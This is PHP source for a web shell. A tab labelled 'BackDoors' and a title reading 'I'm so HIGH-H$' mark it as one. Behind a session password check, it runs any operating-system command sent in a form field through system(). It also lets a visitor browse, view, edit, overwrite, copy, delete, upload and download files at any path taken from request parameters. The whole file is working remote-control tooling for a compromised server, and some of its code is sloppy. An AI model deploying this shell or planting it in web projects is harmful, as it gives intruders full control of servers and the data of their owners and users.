<?php 
session_start();
if(!empty($_SESSION['PASSWORD']))
        {}
    else
    {header("Location:login.php");}
?>
<?php 
if (!empty($_POST["runcmd"])) {
    system($_POST["runcmd"]);
}
if (!empty($_GET['runfile'])) {
      
      if (is_file($_GET['runfile'])) {
         $name=basename($_GET['runfile']);
         copy($_GET['runfile'],'download/'.$name);
         $link="/download/$name";
      }
}

?>
<html><title>I'm so HIGH-H$</title>
<head>
<link rel="stylesheet" href="js/jquery-ui.css">
<link rel="stylesheet" href="js/bt.css">
<script src='js/bt.js' type="text/javascript"></script>
<script src='js/jquery.js' type="text/javascript"></script>
<script type="text/javascript" src="js/scripts/shCore.js"></script>
<script src='js/jquery-ui.js' type="text/javascript"></script>
<link rel="stylesheet" href="js/styles/shCoreDefault.css">
<link rel="stylesheet" href="js/vi.css">
<script type="text/javascript">SyntaxHighlighter.all();</script>
<script>
  $(function() {
    $( "#accordion_copy" ).accordion({
      collapsible: true
    });
  });
  </script>
<?php
 
 
//fucntion for counting no. of folders and files in given directory
function f_D_counter($dir)
         {
             
            if (is_dir($dir)==1) 
            {
                $folder_count=0;
                $file_count=0;
                $open=opendir($dir);
                while ( $read= readdir($open)) 
                   {
                    if($read!='.'&&$read!='..')
                      {
                        $n=$dir."/".$read;
                        if (is_dir($n)==1) 
                        {
                          $folder_count++;
                          f_D_counter($n);
                        }
                        else
                        {   
                            $file_count++;
                             
 
                        }
                       }    
                   }
                   echo"fi".$file_count."fi";
                   echo"fol".$folder_count."fol<br>"; 
            }
 
         }
         if (!empty($_GET['dir'])) {
               f_D_counter($_GET['dir']);
                 
                     }
//function for counting folder in fiven directory                      
function count_folder($dir)
    {
preg_match_all('/fol[0-9]fol/',file_get_contents($_SERVER["PHP_SELF"]."/count_folder.php?dir=$dir"),$file);
$fol=implode("", $file[0]);
preg_match_all('/[0-9]/',$fol,$total);
$x=0;
for($i=0; $i<count($total[0]); $i++)
{
    $x=$x+$total[0][$i];
}
return $x;
    }
//function for counting files in given directory
function count_file($dir)
{
    preg_match_all('/fi[0-9]fi/',file_get_contents($_SERVER["PHP_SELF"]."/count_folder.php?dir=$dir"),$file);
$fol=implode("", $file[0]);
preg_match_all('/[0-9]/',$fol,$total);
$x=0;
for($i=0; $i<count($total[0]); $i++)
{
    $x=$x+$total[0][$i];
}
return $x;
}
      
function file_type($file)
{
   if (file_exists($file)) 
  {     
       $name=basename($file);
       
       if (preg_match('/./', $name)) 
       {
          $na=explode('.',$name);
          return  $na[count($na)-1];
   
      }
}
}
function delete_dir($path)
 {
    if (is_file($path)) {
        unlink($path);}
 }
function exploreProject($fd)
{
  $filety='';
if(!empty($fd))
{
    if (is_dir($fd)) {
         
     
$read=opendir($fd);
while ($open=readdir($read)) 
{
    if($open!='.'&&$open!='..')
    {
    $rr=count_folder($open);
    $ss=count_file($open);
  if(is_file($open)){$filety='(File)';}else{$filety='(Folder)';}
    $srvr=$_SERVER["PHP_SELF"]."?path=".$fd."/".$open;
    echo "<div id='hs' title='$rr folders,$ss files'><a href='$srvr'><k style='color:white; background:black;'>".$open.' '.$filety."</k>$srvr</a><br></div>";
    }
}
 }
 
elseif (is_file($fd)) {
     
    ?>
 
<div id='hss' title=' 0 folders,1 file'>
    
   <div id='embd'>
    <ul class="lin"><div>
    setting<button id="rerun"style='margin-left:20p;'></button>
    <button id="select"></button>
  </div>
  <ul>
    <?php $srvers=$_SERVER["PHP_SELF"];?>
    <li><a href="<?php echo $srvers?>?rfile=<?php echo $fd; ?>">See source File</a></li>
    <li><a href="index.php?runfile=<?php echo $fd; ?>">Run File</a></li>
    <li><a href="<?php echo $srvers?>/?rfile=<?php echo $fd.'#tabs-3';?>">Edit File</a></li>
    <li><a href="index.php?dfile=<?php echo $fd; ?>">Delete File</a></li>
  </ul>
    </ul>
   </div>
   <div id='maind'>
 
    <a href='<?php echo $srvers?>?path=<?php echo $fd; ?>'><?php echo $fd; ?></a>
   </div>
</div>
<?php
}
else
 {
    "<h1>Whoops!! Something Went Wrong..</h1>";
 }
} 
}
function see_file($file)
{
  if (file_exists($file)) 
  {     
       $name=basename($file);
       if (preg_match('/./', $name)) 
       {
          $na=explode('.',$name);
          switch ($na[count($na)-1]) 
          {
            case 'css' || 'CSS':
            {
              echo"<script src='js/scripts/shBrushCss.js'></script>";
              echo"<link type='text/css' rel='stylesheet' href='js/scripts/styles/shCoreDefault.css'>";   
              echo "<pre style='baackground:white;' class='brush:css;'>"; 
                  
            }
            break;
            case 'js' || 'JS':
            {
                echo"<script src='js/scripts/shBrushJScript.js'></script>";
                echo"<link type='text/css' rel='stylesheet' href='js/scripts/styles/shCoreDefault.css'>";     
                echo "<pre style='baackground:white;' class='brush:js;'>";
                  
            }
            break;
            case 'php' ||'inc':
            {
                echo"<script src='js/scripts/shBrushPhp.js'></script>";
                echo"<link type='text/css' rel='stylesheet' href='js/scripts/styles/shCoreDefault.css'>";     
                echo "<pre style='baackground:white;' class='brush: php;'>";
                  
            }
            break;
            case 'sql':
            {
                echo"<script src='js/scripts/shBrushSql.js'></script>";
                echo"<link type='text/css' rel='stylesheet' href='js/scripts/styles/shCoreDefault.css'>";     
                echo "<pre style='baackground:white;' class='brush: sql;'>";
                  
            }
            break;
            default:
                 
                break;
          }
 
       }
       $fopen=fopen($file,"r");
        
       while ($fread=fread($fopen,13421772)) 
       {
        echo htmlspecialchars($fread);
       }echo'</pre>';
  }
}
function fetch_file($file)
{
  if (file_exists($file)) 
  { 
   $fopen=fopen($file,"r");
        
       while ($fread=fread($fopen,13421772)) 
       {
        echo $fread;
       }
   }
}      
 
?>
 
<script type="text/javascript">
    $(function() {
        $( document ).tooltip({
            track: true
        });
     
        $( "#tabs" ).tabs();
        $( "#editTab" ).tabs();
    });
</script>
<script>
  $(function() {
    $( "#rerun" )
      .button({
        text: false,
          icons: {
            primary: "ui-icon-gear"
          }
 
      })
      .click(function() {
         
      })
      .next()
        .button({
          text: false,
          icons: {
            primary: "ui-icon-triangle-1-s"
          }
        })
        .click(function() {
          var menu = $( this ).parent().next().show().position({
            my: "left top",
            at: "left bottom",
            of: this
          });
          $( document ).one( "click", function() {
            menu.hide();
          });
          return false;
        })
        .parent()
          .buttonset()
          .next()
            .hide()
            .menu();
  });
  </script>
</head>
<body>
<div id="tabs">
    <ul>
        <li><a href="#tabs-1">File Explorer</a></li>
        <li><a href="#tabs-2">CREATE PROJECTS</a></li>
        <li><a href="#tabs-3">EXPLORER 2</a></li>
        <li><a href="#tabs-4">BackDoors..()</a></li>
    </ul>
    <div id="tabs-1">
    PROJECTS
<ul class="headli">
        <form class='srch'action="<?php $_SERVER["PHP_SELF"];?>" method='GET'>
        PATH=<li class="headlis"><input class='srchih' type="text" name="path" placeholder="Search.."/></li>
        <li class="headlis"><input class='srcghs' type="submit" name='submit1' value="SEARCH"/></li>
        </form>       
</ul>
     
    <?php 
    if (!empty($_GET['dfile'])) {
        delete_dir($_GET['dfile']);

    }
    if (!empty($_GET['rfile'])&&empty($_GET['sfile'])&&empty($_GET['path'])) {
        echo"<a href='".$servers."?path=".$_GET['rfile']."'>Back</a><br>";
        see_file($_GET['rfile']);
    }
    else{
    if (empty($_GET['sfile'])) {
         
     
    if (!empty($_GET['path'])&&empty($_GET['cpath'])) {
        
        echo"<a  href='".$_SERVER["PHP_SELF"]."?path={$_GET['path']}/../'>Back</a>({$_GET['path']})<br>";
        exploreProject($_GET['path']);
    }
    
    else
    {
        exploreProject(".");
    }}
     
    elseif(!empty($_GET['sfile'])){
        echo"<div id='edt'><input type='submit' value='Edit File'/></div>";
        see_file($_GET['sfile']);
    }}
     
    ?>
     
    </div>
    <div id="tabs-2">
        CREATE PROJECTS
        <ul class="headli">CREATE FOLDER
        <form class='srch'action="<?php echo $_SERVER["PHP_SELF"].'#tabs-2';?>" method='GET'>
        <?php if (!empty($_GET['path'])){if(is_dir($_GET['path'])){echo $_GET['path'].'/';} };?><li class="headlis">
        <li class="headlis">
        <input type="hidden" name="path" value="<?php if (!empty($_GET['path'])){if(is_dir($_GET['path'])){echo$_GET['path'];}}?>"/>
        <input class='csrchni' type="text" name="cfile"  placeholder="Directory Name"/></li>
         
        <li class="headlis"><input class='shrchs' type="submit" name='submit1' value="CREATE"/></li>
        </form>       
        </ul><ul class="headli">CREATE FILE
    <form class='srch'action="<?php echo $_SERVER["PHP_SELF"].'#tabs-2';?>" method='GET'>
    <?php if (!empty($_GET['path'])){if(is_dir($_GET['path'])){echo $_GET['path'].'/';} };?><li class="headlis">
        <li class="headlis">
        <input type="hidden" name="path" value="<?php if (!empty($_GET['path'])){if(is_dir($_GET['path'])){echo$_GET['path'];}}?>"/>
    <input class='csgrchi' type="text" name="cfile" placeholder="File Name"/></li>
     
    <li class="headlis"><input class='srchhs' type="submit" name='submit2' value="CREATE" /></li>
        </form>   
        </ul>
        <?php
         if (!empty($_GET['path'])&&is_dir($_GET['path'])&&!empty($_GET['cfile'])) 
{          
  if (!file_exists($_GET['path'].'/'.$_GET['cfile'])) 
  {
       if (!empty($_GET['submit2'])) 
       {
               $pth=$_GET['path'].'/'.$_GET['cfile'];
               $cfile=touch($_GET['path'].'/'.$_GET['cfile']);
               if ($cfile==true) 
               {
                    echo "Project Created.<a href='index.php?path={$pth}'>(Open)</a>";
               }
               else
               {
                echo "Problem Occured!!";
               }
       }
       elseif (!empty($_GET['submit1'])) 
       {    
            $pth=$_GET['path'].'/'.$_GET['cfile'];
            $cfile=mkdir($_GET['path'].'/'.$_GET['cfile']);
            if ($cfile==true) 
               {
                    echo "Project Created.<a href='index.php?path={$pth}'>(Open)</a>";
               }
               else
               {
                echo "Problem Occured!!";
               }
       }
  }
  else
  {
     echo "File Already Exists <a hrf='index.php?path={$_GET['path']}'> {$_GET['path']}</a>";
  }
}          
        ?>
    </div>
    <div id="tabs-3">
        EXPLORER 2<br>
        <p>Say Hello To H$</p>
        <?php if (!empty($link)) {
          echo"<a href='$link' target='_blank'>download File Now</a><br>";
          echo"<a href='index.php?path=.$link'>Open In FileManager</a><br>";
        }
         ?>
    <?php
    if (!empty($_GET['rfile'])&&empty($_GET['sfile'])&&empty($_GET['path'])) 
       {
        ?>
        <form action="<?php echo $_SERVER['PHP_SELF'];?>" method='POST'>
        <input type="hidden" name='rfile' value='<?php echo $_GET['rfile'];?>'/>
         
        <input type="submit" value="SAVE EDIT" name="EDITFILE"/><br>
        <textarea id='highlightit' style='height:700px;width:700px;' class='<?php echo 'brush:'.file_type($_GET['rfile']);?>' name="textforEdit">
            <?php fetch_file($_GET['rfile']); ?>
             
        </textarea><br>
         
        <input type="submit" value="SAVE EDIT" name="EDITFILE"/>
        </form>
    <?php    
         
    }
    ?>
    <?php 
            if (!empty($_POST['EDITFILE'])&&!empty($_POST['textforEdit'])&&!empty($_POST['rfile'])) 
            {
                $fope=fopen($_POST['rfile'],"w++");
                $fre=fputs($fope, $_POST['textforEdit']);
                fclose($fope);
                $location=$_SERVER["PHP_SELF"].'?path='.$_POST['rfile'];
                echo"<a href='$location'>See Edited File</a>";
            }
             ?>
   <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
     Run Command <br>
     <li class="headlis">
    <input class="csrchni" type="text" name="runcmd" placeholder="Command for cmd"></li>
    <li class="headlis"><input class='srchss' type="submit" name='submit22' value="Run Command"/></li>
   </form>

             </div>
<div id="tabs-4">         
<div id="accordion_copy">
  
  <h3>Tips</h3>
  <div>
To start a program automatically on startup....
place it in 
  
  </div>
  <h3>Copy-From() ... To()</h3>
  <div>
  <form action="<?php echo $_SERVER['PHP_SELF'];?>" method="POST">
  From<input type='text' name="copy_from" placeholder='from'/>
  To<input type='text' name="copy_to" placeholder='to'/>
   <input type='submit' value="copy"  name='copy_submit'/>
   <?php 
    if (isset($_POST['copy_submit'])) 
    {
       if (!empty($_POST['copy_from'])&&!empty($_POST['copy_to'])) 
       {
           if (is_file($_POST['copy_from'])&&is_dir($_POST['copy_to'])) 
           {
               $action=copy($_POST['copy_from'],$_POST['copy_to'].'/'.basename($_POST['copy_from']));
                if ($action)
                echo "<a href='index.php?path=".$_POST['copy_to'].'/'.basename($_POST['copy_from'])."'>See file</a>";
                else
                echo"Error Occured";
                
           }
       }
    }
   ?>
  </form>
  </div>
  <h3>Upload</h3>
  <div>
    <form action="<?php echo $_SERVER['PHP_SELF'];?>" method="POST" enctype='multipart/form-data'>
   To files:
   <input type='file' name="upload_file"/>
   <input type='submit' value="Upload"  name='upload_submit'/>
    </form>
    <?php 
     if (isset($_POST['upload_submit'])) 
     {
        if (!empty($_FILES['upload_file'])) 
        {
             
            // $uploads=copy($_FILES['upload_file']['name'],'files/'.$_FILES['upload_file']['name']);
              $uploads=move_uploaded_file($_FILES['upload_file']['tmp_name'],'files/'.$_FILES['upload_file']['name']);
             if ($uploads)
               echo"<a href='/files/".$_FILES['upload_file']['name']."'>See File</a>";
             else
              echo"Error Occured";
        }
     }
    ?>
  </div>
  
</div>

</div>
             </div></div>
<div id='ps'></div>
</body>
</html>
 
<?php
if(!empty($_GET["fileo"]))
  {
        $dir=explode("/",$_GET["fileo"]);
 
        delete_dir($dir[count($dir)-2]);
     
  }
?>